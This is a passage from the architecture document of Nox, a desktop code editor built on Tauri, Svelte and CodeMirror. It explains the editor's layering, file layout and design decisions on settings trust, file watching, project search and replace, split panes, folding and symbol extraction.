# Nox Architecture

This document explains how Nox is put together and, more importantly, *why*.
If you are about to add a feature, read §2 (Layers) and §5 (How to add a
feature) first. Those two sections determine where your code belongs.

---

## 1. Technology

| Layer | Choice | Why |
|---|---|---|
| Desktop shell | **Tauri 2** (Rust) | ~12 MB binary and ~80 MB RSS against Electron's ~120 MB / ~400 MB. Uses the OS WebView. Real threads available for search, file watching and LSP later. |
| UI | **Svelte 5** (runes) | Compiles to direct DOM updates: no VDOM diff competing with CodeMirror for the main thread. ~3 KB runtime. |
| Editor engine | **CodeMirror 6** | ~250 KB vs Monaco's ~5 MB. Rope-backed document, viewport virtualisation, and no inherited VS Code styling to fight. |
| Grammars | **Lezer** | Incremental parsing; a keystroke reparses a region, not a file. |
| Build | **Vite 8** + TypeScript (strict) | Fast HMR, code splitting per grammar. |
| Tests | **Vitest** | Runs the pure layers headless in Node in ~200 ms. |
| Styling | Plain CSS + custom properties | One token file. No utility framework to fight a bespoke design system. |

### Alternatives considered

**Electron.** Rejected on weight. An editor whose thesis is speed cannot ship
a private Chromium.

**A fully native, GPU-rendered UI (the Zed model).** The right answer with a
graphics team and a multi-year runway. For this project it is a ~10× cost
multiplier on every UI change and forfeits the entire web ecosystem for future
markdown preview, diffing and AI-chat surfaces. Revisitable: rendering sits
behind `ui/`, not smeared through the services.

**Monaco instead of CodeMirror.** Monaco's genuine advantage is near-free
TypeScript IntelliSense. That advantage is real but narrow (it is free for
TS/JS and nothing else), and it comes bundled with 20× the code and a DOM that
carries VS Code's visual DNA. Nox chooses a distinct identity and pays for
language intelligence later via LSP over stdio, which is well-understood work.

**React instead of Svelte.** Larger ecosystem, but Nox writes every component
by hand to hit its design bar, so the ecosystem advantage is never cashed in,
while the reconciler cost lands on the exact thread CodeMirror needs. Mitigated
risk: all logic lives outside components, so a framework swap touches `ui/` only.

---

## 2. Layers

Dependencies point **inward only**. Nothing in an inner ring may import from an
outer one.

```
┌──────────────────────────────────────────────────────────────┐
│ ui/            Svelte components                              │
│                Rendering + input handling. No fs. No logic.   │
│  ┌───────────────────────────────────────────────────────┐   │
│  │ services/   commands · keymap · config · workspace     │   │
│  │             transactions · review · context · jobs     │   │
│  │             permissions · agent/ · filetree · session  │   │
│  │             watcher · search · ui · notifications      │   │
│  │  ┌──────────────────────────────────────────────┐     │   │
│  │  │ core/    pure TS: path, fuzzy, signal,        │     │   │
│  │  │          emitter, languages. Zero imports.    │     │   │
│  │  └──────────────────────────────────────────────┘     │   │
│  │  ┌──────────────────────────────────────────────┐     │   │
│  │  │ platform/  interface Platform { … }           │     │   │
│  │  └──────────────────────────────────────────────┘     │   │
│  └───────────────────────────────────────────────────────┘   │
└──────────────────────────────────────────────────────────────┘
        platform/tauri.ts  ──▶  src-tauri  (Rust, production)
        platform/memory.ts ──▶  in-memory  (browser dev + tests)
```

`editor/` sits alongside `services/`: it owns everything CodeMirror-shaped
(theme, extensions, grammars, find) and is the only place `@codemirror/view` is
imported.

### The two rules that hold it together

**1. `Platform` is the only door to the OS.**
Nothing in `ui/`, `services/` or `core/` imports `@tauri-apps/*`. Two things
fall out of that, and both are load-bearing:

- The whole app runs in a plain browser against an in-memory filesystem, so UI
  work needs no Rust rebuild loop (`npm run dev`).
- Every service is unit-testable against a fake disk with **no mocking
  library**. You construct a different `Platform`. `tests/workspace.test.ts`
  exercises the same code path the browser build uses.

When Tauri's API changes, exactly one file changes: `platform/tauri.ts`.

The updater follows the same rule: its network request, signature
verification and file replacement all happen in the Rust plugin, behind
`checkForUpdate` and `installUpdate` on `Platform`. The renderer sees
`UpdateInfo | null` and nothing else. Absence is never an error.

**2. Every user action is a `Command`.**
Menus, the palette, keybindings and buttons all dispatch the same `commandId`.
The payoff is that the command palette and keybinding customisation are
complete *for free, permanently*, instead of needing a second pass every time a
feature lands. A feature is not done until it has a command.

---

## 3. Where things live

```
src/
├─ core/                 Pure. No DOM, no framework, no I/O.
│  ├─ signal.ts          Observable value; implements the Svelte store
│  │                     contract so components write `$signal`, but has
│  │                     zero imports and runs in Node.
│  ├─ path.ts            POSIX + Windows path handling
│  ├─ fuzzy.ts           O(pattern × text) DP matcher for palette/quick-open
│  ├─ diff.ts            Myers line diff; hunks for review and Git
│  ├─ git-status.ts      Porcelain v2 → branch, staged/unstaged, renames
│  ├─ git-blame.ts       Blame porcelain → a commit per line, and its label
│  ├─ tasks.ts           tasks.json → tasks, and the argv an approval keys on
│  ├─ replace.ts         Replacement computation and expansion
│  ├─ languages.ts       Language identity (no parsers)
│  ├─ symbols.ts         Named structure in a file, read from a parse tree
│  └─ emitter.ts         Typed events
│
├─ platform/             The OS boundary
│  ├─ types.ts           interface Platform, PlatformError
│  ├─ memory.ts          In-memory filesystem (dev + tests)
│  ├─ web.ts             Browser target: memory FS + localStorage config
│  ├─ tauri.ts           Desktop target: thin adapters over Rust commands
│  └─ demo-workspace.ts  Seed project for the browser build
│
├─ services/             Application logic. Framework-free.
│  ├─ commands.ts        Command registry
│  ├─ keymap.ts          Chord parsing, resolution, display formatting;
│  │                     the default table plus the user rules over it
│  ├─ config/schema.ts   THE settings schema. Types derived from it
│  ├─ config/index.ts    ConfigService: the three layers, coerce, persist
│  ├─ workspace.ts       Buffers, tabs, dirty tracking, file operations,
│  │                     change-set application and grouped undo
│  ├─ transactions.ts    ChangeSet, Author, the transaction log
│  ├─ review.ts          Staged change sets; hunk accept/reject
│  ├─ context.ts         Structured read access for programmatic callers
│  ├─ permissions.ts     Capabilities, policy, prompts, decision log
│  ├─ jobs.ts            Long-running work: progress, cancellation
│  ├─ lsp/               Language servers: JSON-RPC, lifecycle, document
│  │                     sync, servers.json, the diagnostics store
│  ├─ agent/protocol.ts  The agent wire contract and transport seam
│  ├─ plugin/           Third-party code: manifest, host, discovery, wire
│  ├─ agent/provider.ts  Vendor-neutral model interface
│  ├─ agent/ollama.ts    A local model: prompt, parser, edit resolution
│  ├─ agent/runtime.ts   Sessions, audit trail, session-level undo
│  ├─ agent/stdio.ts     Agents in another process, over line-delimited JSON
│  ├─ filetree.ts        Explorer model + quick-open index
│  ├─ watcher.ts         Reacts to changes made outside Nox
│  ├─ session.ts         Restore folder, tabs, cursors and unsaved work
│  ├─ notes.ts           The user's own notes. No workspace, by construction.
│  ├─ tasks.ts           The project's own commands. Two files, and only one
│  │                     of them runs without being asked about
│  ├─ ui.ts              Overlay/focus state; owns "what does Escape close"
│  ├─ notifications.ts   Toasts
│  ├─ search.ts          Project search: query, options, streamed results
│  └─ updates.ts         Checks for and installs newer releases; one click
│                        consents to download, install and restart
│
├─ editor/               Everything CodeMirror-shaped
│  ├─ theme.ts           Nox theme + syntax highlight style
│  ├─ extensions.ts      Composes extensions from settings, one Compartment
│  │                     per setting group
│  ├─ languages.ts       Lazy grammar loading
│  ├─ commands.ts        Commands CM6 lacks (add cursor above/below, go to line)
│  ├─ find.ts            Drives CM's search engine from Nox's find panel
│  ├─ provenance.ts      Who changed what, as ranges. Gutter and tooltip.
│  ├─ folding.ts         Fold gutter, markers, and fold-to-level
│  └─ search-highlight.ts Paints matches (CM ties its own highlighting to its panel)
│
├─ ui/                   Svelte. Rendering only.
├─ styles/tokens.css     The design system. Single source of visual truth.
├─ app.ts                NoxApp: owns services, registers commands + keys
└─ main.ts               Bootstrap

src-tauri/src/
├─ main.rs               Entry point
├─ lib.rs                Builder, plugin + command registration
├─ fs.rs                 Filesystem commands. No logic.
├─ http.rs               Streaming HTTP to loopback. No logic.
├─ agent.rs              Supervises agent subprocesses over line-delimited JSON
├─ lsp.rs                Supervises language servers; Content-Length framing
├─ pty.rs                Terminal sessions on a real pty
├─ search.rs             Parallel, gitignore-aware project search
├─ git.rs                Index file bases (gutter), and the six stage/
│                        commit/branch commands
└─ watcher.rs            Recursive workspace watch, plus a second, targeted
                         watch on `.git`'s HEAD and index
```

---

## 4. Key design decisions

### Buffers own an `EditorState`, not a string

Each buffer holds a CodeMirror `EditorState`. Switching tabs is
`view.setState()`, which is why per-tab undo history, selection and scroll
position survive a tab switch. `@codemirror/state` is DOM-free, so
`WorkspaceService` still runs headless under Vitest.

The view-layer extension set is *injected* as a `StateFactory` rather than
imported, so `workspace.ts` never depends on `@codemirror/view`. Tests pass
`() => []`.

### Transactions flow through the workspace

`EditorPane` dispatches through `workspace.applyTransaction(id, tr)` rather
than letting the view own its state. The workspace therefore holds the
authoritative state for *every* buffer, including background tabs, which is
what makes "save all" and session restore correct rather than approximate.

### Dirty tracking is exact, then pragmatic

`isDirty` compares the current document against the saved one, so undoing back
to the saved content clears the marker. Above 2 MB
(`EXACT_DIRTY_LIMIT`) the comparison degrades to a change counter, because a
full rope walk per keystroke is exactly the kind of cost that makes an editor
feel slow. **Known limitation:** on files over 2 MB, undoing to the saved state
leaves the tab marked dirty.

### Settings drive everything, from one schema

`config/schema.ts` defines every preference: type, default, bounds, label,
category. From it we derive the `Settings` type, the persisted-JSON validator,
and the entire settings UI. Adding a preference is a one-line change there and
nowhere else. **No component may hardcode a default.**

**Three layers, and the top one is untrusted.** Effective settings are the
schema's defaults, then the user's `settings.json`, then the open project's
`.nox/settings.json`. That last file arrives with a cloned repository, so the
keys it may supply are an **allowlist on the schema** (`workspace: true`),
eight wide, holding only facts about the code: indentation, trimming, format
on save, what to hide. `terminal.shell` is the name that makes the rule
concrete: a repository that could set it would run a binary of its author's
choosing the first time you opened a terminal. Nothing naming a program, a
path or an address goes in the list. Every write still lands in the *user*
layer; the panel refuses to offer a control for a key the project owns, and
points at the file instead. Design:
`docs/superpowers/specs/2026-08-20-workspace-settings-design.md`.

Only non-default values are written to `settings.json`, so upgrading Nox picks
up new defaults instead of freezing whatever shipped first.

### One Compartment per setting group

Changing the font size dispatches a `reconfigure` for the theme compartment
only. It never rebuilds the state. A rebuild would discard undo history and
scroll position, which users notice immediately and never forgive.

Buffers created while a background tab was inactive may carry stale
compartment config, so `EditorPane` reconfigures *all* compartments on tab
activation.

### Two keymaps, one owner per chord

Application chords (open, save, palette) live in `services/keymap.ts` and are
resolved on the **capture** phase of `window`. Editing chords (undo,
multi-cursor, comment) belong to CodeMirror. Neither layer binds a chord the
other owns, so there is never a race over `preventDefault`.

`Escape` is the interesting case: it is bound at app level with a guard
(`when: () => ui.hasDismissible()`), so it closes an overlay when one is open
and otherwise falls through to CodeMirror to collapse multi-cursors.

The application layer has **two tiers**: the defaults `app.ts`'s
`#registerKeybindings` builds with `bind()`, and a list of `KeybindingRule`s
read from `keybindings.json`. A rule is *applied over* the defaults, and the
default table is never edited, which is what makes resetting a customisation a
deletion rather than a remembered original. `#rebuild()` replays the defaults
minus every `(chord, command)` pair a `remove` rule names, then applies the
additions; additions go last, and `#add` unshifts, so a user binding beats a
default on the same chord with no extra precedence machinery. `when` cannot be
serialised and `arg` usually is not, so both are inherited from the command's
own default, so rebinding Escape keeps its guard.

Recording a new chord is a **mode of the service** (`beginCapture` /
`endCapture`), not a listener in the panel: the service already resolves on the
window's capture phase, so a claimed chord would be handled before any
descendant element could see it. While capturing, every key is swallowed and
handed to the recorder, and nothing runs. Design:
`docs/superpowers/specs/2026-08-20-keybinding-editor-design.md`.

### The explorer renders a window, and the model never knew

`FileTreeService` has exposed the tree as a flat ordered list since v0.1, with
a header saying why: flat is what the renderer wants, and it leaves the door
open for windowing. `ExplorerPanel` now walks through that door alone. No
service, no test and no `FlatNode` changed. It renders the slice of `nodes`
the viewport covers plus an overscan, between two `role="presentation"`
spacers that stand in for the rest, so the scrollbar describes the whole tree
and every row keeps its true offset. Spacers rather than a transform: the
container is also the drop target and the keyboard surface, and a transformed
child changes what `contains()` and `getBoundingClientRect()` mean for both.

Two rules make it safe. **The row height has one home**, a TS constant that
the stylesheet reads back through `--nox-tree-row-h`, because windowing by
index breaks silently if the painted height and the arithmetic disagree. And
**what cannot be measured is not windowed**: a viewport height of zero (before
layout, or under jsdom) renders every row, since windowing an unmeasured
viewport would render nothing. Design:
`docs/superpowers/specs/2026-08-20-explorer-virtualisation-design.md`.

### A collapsed folder answers for what is inside it

The tree marked changed and unsaved *files*, so folding `src/` over forty
changes made it read exactly like folding one over none. `core/folder-marks.ts`
turns the two per-file facts the panel already holds into per-folder ones.

**The roll-up is built from the status list, never by walking the tree.** That
is the whole reason it works: `FileTreeService` loads directories lazily, so a
folder nobody has expanded has no entries to walk, and a tree-walking roll-up
would answer "nothing in here" for exactly the folders the user has not looked
inside. Git and the buffer list know about paths whether or not the tree does.
Climbing stops once an ancestor already holds a letter at least as severe,
because the walk that set it had already raised everything above it. That costs
one visit per distinct ancestor rather than one per file per level. Comparing
*presence* instead of severity is the bug that shape invites: a conflict
arriving after an ordinary edit had claimed the folder above it would never
reach the rows above that.

**A folder shows the worst letter beneath it, and only while collapsed.**
Worst rather than a count: a count answers "how much" when the question is
"should I open this", loses the conflict entirely, and does not fit the rail.
`C` outranks everything because staging a conflict is the one action that is
actively harmful, the same argument that spends a scarce letter on it in
`core/git-status.ts`. `U` ranks last because a folder of untracked build output
would otherwise shout over a real change above it. Collapsed-only
because an expanded folder's rows already answer, and because it makes the
right edge single-occupancy by construction: `#flatten` gates `loading`,
`empty` and `error` on `expanded`, so a row that can carry a marker can never
also want the note slot, and the two need no precedence rule between them.

The character, its colour token and the 8 px dot are the file markers
unchanged. The twisty and the folder icon already say which kind of row this
is, so a second visual tier would be a new language for a distinction the row
has made. Only the accessible name differs: *Contains modified files*, not
*Modified*, which is also what keeps the difference off colour alone
(WCAG 1.4.1).

Two consequences worth naming. A **gitignored** folder is exempt from the
letter for free, since `git.rs` runs without `--ignored`, so those paths never
reach the status list and there is nothing to roll up. It is deliberately not
exempt from the dot, because unsaved is not a git fact and you opened that
file on purpose. And the git half rides `git.status` as the per-file map does,
while the dirty half rides `workspace.buffers` and is therefore on the typing
path: it stays inside rule 5 by climbing the *dirty* set rather than the open
one, so nothing unsaved costs nothing at all.

### Nox draws its own find UI

CodeMirror's search *engine* is excellent and its panel looks nothing like Nox.
We keep the engine (`SearchQuery`, `findNext`, `findPrevious`) and draw our own
panel. Replace is the exception and is ours: see *The editor borrows the match
and owns the text* below. One consequence worth knowing is that CM ties
highlighting to the lifecycle of its panel, which we never open, so
`editor/search-highlight.ts` decorates matches itself, viewport-bounded.

### File watching: policy in one place

Rust runs a single recursive `notify` watcher on the workspace root and
forwards raw events. **All policy lives in `services/watcher.ts`.** The Rust
side only filters noise directories (`.git`, `node_modules`, `target`, …),
because a `cargo build` inside the workspace would otherwise push tens of
thousands of events across the IPC boundary before anyone could ignore them.
Coalescing, debouncing and every user-facing decision sit on the TypeScript
side, where they can be unit-tested against `MemoryPlatform`.

Three rules govern the behaviour:

1. **Never fight the user.** A *clean* buffer reloads silently, because that
   is what clean means. A *dirty* buffer is never overwritten. It is marked
   and the
   conflict is resolved at save time with an explicit
   Overwrite / Discard & Reload / Cancel choice.
2. **Never mistake our own writes for someone else's.** Every open buffer
   records the mtime Nox last read or wrote (`Buffer.diskMtime`). An event
   whose fresh `stat` matches that value is ours and is dropped. This is far
   more reliable than suppressing events in a time window around a save.
3. **Never storm.** Events coalesce over 180 ms; the much more expensive
   quick-open re-index runs on a separate 2 s timer, and a plain content
   modification never triggers a tree refresh at all.

A deleted file keeps its tab, struck through and marked. The content is still
in memory, so nothing has been lost, and saving recreates the file.

**Known limitation:** the mtime comparison is only as fine-grained as the
filesystem. On a volume with one-second mtime resolution, an external write
landing in the same second as a Nox save can be misread as our own.

### Reloads are transactions, not state resets

`reloadFromDisk` replaces the document with a *transaction* rather than a new
`EditorState`. That keeps scroll position, maps the selection through the
change, and leaves the reload on the undo stack, so a surprise reload is
recoverable with ⌘Z.

For that to reach the buffer you are actually looking at, the workspace needs
to push into the live view. `ViewDispatcher` is the mirror image of
`applyTransaction`: `EditorPane` registers one, and it returns false for any
buffer that is not on screen, in which case the workspace applies the change to
the background state itself.

### File operations re-point buffers

A rename that leaves a tab aimed at a dead path *looks* fine right up until you
press save. So `renamePath` moves the file and then walks every open buffer,
re-pointing anything at or beneath the old path: updating its path, name,
detected language (the extension may have changed, which means a different
grammar) and recorded mtime.

Deleting splits on dirty state, for the same reason the watcher does: clean
buffers close, because you asked for the file to be gone; dirty ones stay open
and marked `deleted`, because losing unsaved work to a menu click is not a
trade the user agreed to.

Deletion goes to the **OS trash**, not `unlink`. A text editor should never
make a file unrecoverable with one click. `PlatformCapabilities.recoverableDelete`
advertises whether that is true, and the confirmation dialog changes its wording
accordingly: "Move to Trash" on the desktop, "deleted permanently" in the
browser target where there is nothing to recover from.

### Selection tracks three things, not one

`ExplorerSelection` holds `paths` (what is selected), `lead` (the focused row)
and `anchor` (where a Shift-range started). Conflating `lead` and `anchor` is
the classic multi-select bug: the range then only ever *grows*, because each
Shift+Arrow re-anchors where it just landed. Keeping them separate is what lets
Shift+Down then Shift+Up shrink the range back, which is what every file
manager does and what everyone's fingers expect.

Range operations take the ordered list of visible paths as an argument instead
of reaching into `FileTreeService`, which keeps the model pure and testable.
`tests/selection.test.ts` runs it against a plain array.

Two rules exist because they prevent operating on things you cannot see:

- **Collapsing a folder drops the selection inside it.** Otherwise Delete would
  act on rows that are off-screen.
- **Nested paths reduce to their top-level ancestor** before any destructive
  operation (`topLevelPaths` in `core/path.ts`). Selecting a folder *and* a file
  inside it and pressing delete would otherwise remove the folder and then fail
  on the file with "not found".

### Dragging is two unrelated mechanisms

**Inside the tree** it is ordinary HTML5 drag and drop, and a drop resolves to
a *folder*: dropping onto a file targets the folder containing it, because
nobody intends to drop "into" a file. Validity is decided in `dragover` by
`canMoveInto`, and only a valid target calls `preventDefault`, so an illegal
drop is refused by the browser before it happens rather than failing halfway
through a rename.

One subtlety that bit during development: a row's `dragover` bubbles to the
tree container, whose handler re-targets the drop at the workspace root. Row
handlers therefore `stopPropagation`, or an invalid drop on a row would fall
through and move the files to the root instead.

**From the OS** it cannot use HTML5 drop at all: the webview hands over a
sandboxed `File` with no path attached, so Nox would have nothing to open. It
goes through Tauri's native `onDragDropEvent` instead, behind
`PlatformCapabilities.externalFileDrop`, which is why the browser target simply
does not offer it. The overlay is `pointer-events: none`, because during an OS
drag the pointer belongs to the OS and intercepting it would swallow the drop.

Routing is the rule people expect without being told: files become tabs, a lone
folder becomes the workspace, and in a mixed drop the files win.

### Project search is the one thing Rust genuinely owns

Everything else in `src-tauri/` is a thin adapter. Search is not: it is a
parallel, gitignore-aware walk over a whole repository (`ignore`, ripgrep's
own walker, plus `regex`), and doing it in the webview would either block the
main thread or push the entire tree through IPC file by file.

Results **stream in batches** (`nox://search-batch`, flushed every ~90 ms or 40
files) rather than arriving at the end, so a large repo paints its first hits
immediately. Two consequences worth knowing:

- Batches can arrive *before* `nox_search_start` returns the id they belong to,
  so `platform/tauri.ts` buffers early ones and replays them. Without that, the
  fastest results, the ones from files already in page cache, are the ones
  that get dropped.
- The service tags each run with a generation counter and discards batches from
  a superseded search, because typing another character starts a new one while
  the old walk is still finishing.

`require_git(false)` is set deliberately: `ignore` otherwise only applies
`.gitignore` inside an actual git repository, so opening a plain folder that
has one would silently search everything it lists. A `.gitignore` is the user's
stated intent whether or not `git init` has been run.

The in-memory platform implements search **for real**, not as a stub, so the
browser target gets working project search and every service test exercises the
same code path. The pure matching primitives live in `core/search-match.ts` and
deliberately mirror `src-tauri/src/search.rs`; where the two must agree
(preview windowing, whole-word semantics, column units) the same cases are
asserted on both sides. Columns are UTF-16 units so the Rust numbers line up
with JavaScript string indexing. An emoji earlier in the line would otherwise
shift every highlight after it.

### Replace decides which text is authoritative

Project replace is the most destructive thing Nox can do: it rewrites files the
user cannot see. Three rules make that safe.

**An open buffer beats the file on disk.** Search results come from disk, so
replacing disk text under a buffer with unsaved edits would silently throw that
work away. `#sourceTextFor` returns the buffer's text when the file is open,
and the replacement is *recomputed* from it rather than trusting the stored
result rows, which may be stale for a file edited since the search ran.

**Open files change through a transaction**, not a write. `workspace.apply`
routes through the live view where possible, so a project replace lands in the
editor's own undo history and ⌘Z works on it like any other edit. A file that
was clean is saved afterwards so disk and editor agree; a dirty one keeps its
unsaved state and stays the user's to save.

**Everything else gets a journal.** Each replace records `{path, before, after}`
per file. `undoLastReplace` restores a file only if its current contents still
equal what the replace produced. If anything has touched it since, that file
is skipped and counted, because restoring it would destroy newer work. The
outcome is never silently partial: the notification says how many were left
alone.

Replace runs in TypeScript, not Rust, even though search does not. Search needs
a parallel walk over a whole tree; replace operates on an already-bounded
result set (capped at 5000 matches) and needs the buffer and undo logic that
only exists in the renderer. Splitting it across the boundary would buy
nothing and duplicate the rules above.

### The editor borrows the match and owns the text

⌘F's replace no longer calls `@codemirror/search`'s `replaceNext`/`replaceAll`.
It walks the same `SearchQuery` cursor those did, but the string each match is
replaced *with* now comes from `core/replace.ts`, the same `expandReplacement`
and `preserveCase` the project panel runs through. That is the whole point of
the split: ⌘F and ⌘⇧F can no longer write different text for the same match,
because there is only one function that decides what the text is.

**Matching deliberately did not move.** The first attempt computed the editor's
replacements through `computeReplacements` outright, and it was built, measured
and reverted: that function is line-based, so it lost multi-line regex, the
`\n`/`\t` unquoting of the find field, and the Unicode character categorizer
behind whole-word. `café café` stops matching both halves the moment a plain
`\b` stands in for it. `SearchQuery` carries all three. Because the counter, the
highlights and replace-all now walk one query, they also cannot disagree about
what counts as a match.

**What the editor path still owns** is everything about *which* match: that a
replace only writes when the selection covers a match exactly (otherwise it
advances, which is what makes Replace safe to lean on), that the search wraps at
the end of the document, where the selection lands, and scrolling it into view.
That is `replaceNext`'s contract, rebuilt on the one cursor the public API
exposes, including two bounds that read like details and are not. The wrap
search stops at `from` for a regex query and `from + query.length` for a literal
one, so it can only return a match *behind* the cursor; searching the whole
document instead lets a match straddling the cursor come back and drags the
selection backwards. And the literal path alone rejects a result identical to
the range it started from, so a document with one match does not "advance" to
itself.

One trap is worth naming because it shipped once. **Read the cursor by shape,
never by class.** `RegExpCursor`'s constructor `return`s an unexported
`MultilineRegExpCursor` for any pattern containing `\s`, `\W`, `\D`, `\n`, `\r`
or `[^`, and that class is neither exported nor a subclass, so an `instanceof`
test silently loses the match object for exactly those patterns and writes the
raw `$1` template into the document.

`src/editor/find.ts` has no automated tests; §7 records why anything embedding a
CodeMirror view does not. A manual walk of both panels is its only coverage, and
the plan that introduced this split treats that walk as a required step rather
than a formality.

### Split panes: one document, however many tabs show it

Two views over one document stay in step by **forwarding changes**, not by
sharing an `EditorState`. When a pane's transaction reaches
`applyTransaction`, its `changes` are dispatched to every other pane showing
that file, carrying `mirroredAnnotation` so the receiver knows not to send it
back. Only the changes travel, never the `Transaction`, because
`@codemirror/view` rejects one that does not start from the state it is applied
to.

Two rules keep that from looping or double-applying. A transaction that is
itself a mirror is never forwarded again, guarded in the workspace rather than
in the panes, because a consumer that re-enters without checking would
otherwise bounce one keystroke between two views forever. And forwarding only
happens when the caller says which pane it is: without that there is no way to
skip the sender, and it would apply its own change twice. That is exactly how
the watcher's fake pane found this, as `RangeError: Applying change set to
a document with the wrong length`. A caller that does not identify itself gets
the behaviour it had before panes could be mirrored.

Each pane keeps its own cursor, saved and restored. `selectionOf(id, groupId)`
asks *that pane* rather than the buffer, whose state carries whichever view
moved last. The selection is **pulled** at save time, never published, because
a cursor moves on every keystroke and only the session ever reads it. Coming
back, the mirror's cursor is parked in `takePaneSelection` for the pane to
claim when it mounts, rather than written through `setSelection`, which moves
the buffer and would drag the first pane along with it.

A mirrored pane survives a restart. `TabRecord` carries `mirror: true` on the
second and later appearances of a buffer, and `restore` calls `mirrorInto`
for those rather than `open`, which would focus the tab an earlier group had
already restored instead of adding one.

**VERSION stays 4 on purpose.** `#read` discards a session whose version it
does not recognise, the same all-or-nothing check `notes.json` has, so
bumping it would cost every tab and every unsaved-backup pointer to gain one
pane. The field is optional in both directions instead: an older session has
no marker and restores exactly as it did, and an older Nox reading a newer
session ignores the marker and opens the file once, which is what it did
before mirroring existed.

`view.openCopyToSide` builds the second pane itself rather than calling
`splitEditor`, which *moves* the active tab when its group has more than one.
A copy has to leave the original where it is, or it is the split command under
a different name.

A buffer used to belong to exactly one group, and four things quietly relied
on it: `#groupOf` was a `find` and so addressed whichever pane came first;
`close` deleted the document rather than the tab; `buffers` was every group's
tabs flattened, so a file in two panes appeared twice; and `#dispatchToView`
stopped at the first view that accepted a change, which would update one pane
and leave the other showing text that no longer exists.

All four now take the second pane into account, and `mirrorInto(groupId,
bufferId)` is how a second tab is made. What did **not** change is the part
worth protecting: both tabs point at one `Buffer`, so there is still one
`state`, one dirty flag, one undo history and one entry in `buffers`. Saving,
replace, the transaction log and the watcher are untouched by this, which is
the whole reason it is shaped this way rather than by copying the document.

The workspace holds a flat list of **editor groups**, each with its own tab
order and active tab. `activeId` is now *derived*, being the active buffer of
the active group, so every command written against "the editor" keeps working
unchanged, and `app.view` is re-pointed at whichever pane has focus.

**A buffer belongs to exactly one group.** This is the load-bearing invariant:
`buffer.state` stays the single source of truth that saving, dirty tracking,
session restore and project replace all depend on. Allowing the same document
in two panes would mean two CodeMirror views over one document, which CM6 does
not support without forwarding transactions between them and reconciling their
selections, and it would break that invariant for every feature already built.
The cost is that you cannot yet view one file in two panes. That is recorded as
known debt rather than smuggled in.

Two consequences fall out of the invariant, and both are what people expect
anyway: splitting *moves* the active tab across (with one tab there is nothing
to move, so the new pane starts empty and waits), and dragging a tab to another
pane's strip moves it rather than copying.

**The layout is a flat list, not a tree.** Side-by-side is what splits are
actually for; arbitrary nesting costs a recursive layout model and a much
harder drag target story for a case most people never reach. Orientation is a
single setting for the whole layout (`workbench.splitOrientation`), so you get
columns or rows but not both at once.

Groups fold away when emptied, whether by closing the last tab in a pane or by
dragging it out, because a layout with a hole where a pane used to be is worse
than one that heals. Closing a *pane* deliberately keeps its tabs, moving them into the
neighbour: that is a layout change, not a close-all.

One bug worth remembering: tab drag state lives in `UIService`, not in the
`TabBar` component. A tab dragged between panes starts in one component and is
dropped on another, and a receiving strip with component-local state has no
idea a drag is in progress, so it never calls `preventDefault` and the drop
silently does nothing.

### Folding is grammar-driven, and its chords are ours

Fold ranges come from the language grammar via CodeMirror's fold service, so
folding exists only for languages Nox ships a parser for. That is deliberate:
indentation-guessed folds are wrong often enough to be worse than none, and the
gutter simply shows no arrow where there is nothing to fold.

Fold state lives in the `EditorState`, which the workspace owns per buffer, so
folds survive a tab switch for free, exactly like selection and undo history.

CodeMirror ships a `foldKeymap`, and Nox does **not** use it. Its chords are
`Ctrl-Shift-[` / `Ctrl-Shift-]`, which on Windows and Linux are the same chords
Nox already binds to previous/next tab. Since the application keymap resolves on
the capture phase it would win, and folding would silently never fire on those
platforms. Folding is registered as application commands on the `⌥` variants
instead, which also puts every fold action in the palette and the shortcut
reference, per the "one layer owns each chord" rule in §4.

`foldRangesAtLevel` is pure and view-free so it can be tested against a real
parse headlessly. It walks lines once, keeping a stack of enclosing fold end
positions, which gives each candidate's depth without re-walking the tree per
line.

### Symbols come from one table, not one per language

Go to Symbol reads the tree folding already depends on, so it adds a reader and
not a source. `core/symbols.ts` takes a `Tree` and a `Text` and returns the
symbols in document order; like `foldRangesAtLevel` it is pure and view-free,
and is tested against real parses with no DOM.

**The rules are keyed by Lezer node name, with no dispatch on the file's
language.** One table of 25 node names says what kind each is and where to read
its name from, and the walk keeps a stack of enclosing names so a method comes
out as `Foo.render`. Fuzzy matching runs over that title, which is what lets
either half of it find the method.

The deciding case is mixed-language files. `@codemirror/lang-html` configures
the HTML grammar to nest the CSS and JavaScript ones, so a single `.html` tree
holds `RuleSet` *and* `FunctionDeclaration` nodes; `.svelte` and `.vue` load
that same grammar in `editor/languages.ts`, so they are the same case. Rules
keyed by the file's language would look up "html", find the rules for a grammar
that deliberately collects nothing, and return an empty list for a file plainly
full of structure, silently, because an empty list is also a legitimate
answer. A shared name table has nothing to get wrong: it matches whatever node
it meets, whichever grammar produced it. It has to be the *language* rather
than the bare grammar, though. `@lezer/html` on its own does not nest, and
gives back `StyleText` and `ScriptText` with no structure inside them.

One table works because the names do not collide. `FunctionDeclaration`,
`FunctionDefinition` and `FunctionItem` are three spellings of one idea in
three grammars. The cost is that two grammars using
one name for two different things would have to agree; none of the five that
contribute rules does, and this is a single file to change if that ever stops
being true.

**Every name in the table is read off a parse of the construct it claims to
match**, and this paragraph claimed that before it was true. It said a
`MethodDeclaration` takes its name from a `PropertyDefinition` or
`PropertyName` child. `PropertyName` is what the JavaScript grammar produces
for the `b` in `a.b`, and never appears under a method; `#foo() {}` is named by
a `PrivatePropertyDefinition`, which was in neither the table nor this page. So
every private method in a file was dropped without a trace, 26 of `app.ts`'s
own 63, and the tests agreed, because they were written from the same table.
Rust's `ImplItem` was read the same way, by taking the last direct
`TypeIdentifier` child: that is the target type in `impl Display for Foo`, but
in `impl Foo<T>` a `GenericType` wraps the type so there is no such child at
all, and in `impl<T> Display for Inner<T>` the only one left is the *trait*.
The impl's target is now taken by position, the type before the block,
because position is what the grammar keeps stable across all four shapes.
Guessing produces a list that is wrong rather than empty, which is the more
expensive kind of wrong.

**Markdown headings come out flat and need no exception to.** They nest by
level, not by containment: an ATX or Setext heading node spans only its own
line, so it is a sibling of what follows it and never an ancestor, and the
enclosing stack is empty again before the next heading is entered. A `flat`
flag was written for this on the strength of the opposite prediction, then
deleted: forcing it off against a real parse produced byte-identical output.

**Structure only, and JSON and HTML collect nothing themselves.** A file
exporting thirty constants would bury its own functions, and fuzzy matching
stops discriminating once everything is in the list, so variables, constants
and imports are left out. JSON has no declarations to collect. HTML's only
structural node is `Element`, so its own outline would be every `<div>` in the
file; what it contributes instead is the nesting above.

**A symbol list is only as good as the parse frontier**, and this is the part
that decides whether the feature is honest. `syntaxTree(state)` returns what
CodeMirror has parsed so far, not the document. On one measured run, a fresh
